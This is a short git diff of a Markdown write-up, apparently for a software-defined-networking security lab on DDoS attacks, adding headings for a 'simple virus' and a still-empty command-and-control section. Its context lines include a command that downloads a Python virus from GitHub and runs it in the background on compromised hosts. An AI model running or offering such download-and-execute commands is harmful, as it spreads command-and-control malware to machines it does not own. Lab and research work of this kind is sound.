@@ -68,6 +68,8 @@ We also use `tcpdump` to capture and analyze packets on the network. It provides
 
 # Building a simple virus
 
+## The Virus
+
 We will need to control the hosts in the future. To do so, we will create a simple virus that connects to a command and control server to receive commands.
 
 The virus is available on [*GitHub*](https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py).
@@ -81,6 +83,10 @@ The virus can be launched on the compromised hosts using the following command:
 ```bash
 wget wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py && python3 virus.py &
 ```
+
+## Control and Command Server
+
+TODO
 
 # Host Compromise
 
